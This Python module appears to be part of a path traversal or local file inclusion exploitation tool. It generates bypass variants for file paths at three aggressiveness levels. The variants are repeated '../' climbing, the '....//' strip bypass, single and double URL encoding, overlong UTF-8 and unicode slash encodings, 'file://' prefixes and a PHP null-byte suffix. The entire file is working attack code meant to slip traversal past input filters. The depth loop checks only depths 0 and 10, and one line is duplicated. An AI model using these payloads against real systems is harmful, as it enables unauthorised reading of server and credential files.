LEVEL = 1
CACHE_FILTER = None
MAX_DEPTH = 10


def set_level(input_level: int):
    global LEVEL
    global CACHE_FILTER

    input_level = min(input_level, 3)
    input_level = max(1, input_level)

    LEVEL = input_level
    CACHE_FILTER = None


"""
return list of all possible bypasses 
"""


def calc_filters():
    global LEVEL

    res = [FilterByPass()]

    suffixes = [""]

    if LEVEL > 1:
        suffixes.append("\0")  # null byte for < PHP 5.4

    for suffix in suffixes:

        res.append(FilterByPass(prefix="file://", suffix=suffix))

        # climb up directory tree
        for level in [0, MAX_DEPTH]:

            res.append(FilterByPass(prefix="../" * level, suffix=suffix))

            res.append(FilterByPass(prefix="/" + "../" * level, suffix=suffix))  # if payload is part of filename

            # bypass traversal sequences removed non-recursively
            if LEVEL > 1:
                res.append(FilterByPass(replacers={"../": "....//"}, prefix="../" * level,
                                        suffix=suffix))
                res.append(FilterByPass(replacers={"/": "%2f"}, prefix="../" * level, suffix=suffix))

            if LEVEL == 3:
                res.append(FilterByPass(prefix=".././" * level, suffix=suffix))

                # double encode
                res.append(FilterByPass(replacers={"/": "%252f"}, prefix="../" * level, suffix=suffix))
                res.append(FilterByPass(replacers={"/": "%c0%af"}, prefix="../" * level, suffix=suffix))
                res.append(
                    FilterByPass(replacers={"/": "%252f", ".": "%252e"}, prefix="../" * level, suffix=suffix))
                res.append(
                    FilterByPass(replacers={"/": "%c0%af", ".": "%252e"}, prefix="../" * level, suffix=suffix))
                res.append(
                    FilterByPass(replacers={"/": "%c0%af", ".": "%252e"}, prefix="../" * level, suffix=suffix))

                # unicode
                res.append(FilterByPass(replacers={"/": "%u2215"}, prefix="../" * level, suffix=suffix))
                res.append(
                    FilterByPass(replacers={"/": "%u2215", ".": "%uff0e"}, prefix="../" * level, suffix=suffix))

    return res


def get_bypass_possibilities():
    global CACHE_FILTER

    if CACHE_FILTER is None:
        CACHE_FILTER = calc_filters()

    return CACHE_FILTER


class FilterByPass:
    found_bypass = False

    def __init__(self, replacers=None, prefix="", suffix=""):
        if replacers is None:
            replacers = {}
        self.replacers = replacers
        self.prefix = prefix
        self.suffix = suffix

    """
    call if current bypass worked
    """

    def adjust(self, path_to_include):

        path_to_include = self.prefix + path_to_include + self.suffix

        for (k, v) in self.replacers.items():
            path_to_include = path_to_include.replace(k, v)

        return path_to_include

    def describe_current_filter(self):

        res = ""

        if self.prefix:
            res = res + "Prefix: " + self.prefix.replace("\0", "%00") + "; "
        if self.suffix:
            res = res + "Suffix: " + self.suffix.replace("\0", "%00") + "; "

        for (k, v) in self.replacers.items():
            res = res + f"Replace '{k}' with '{v}'; "

        if res.endswith("; "):
            res = res[:-2]

        if not res:
            res = "None"

        return res

    def __str__(self):
        return self.describe_current_filter()
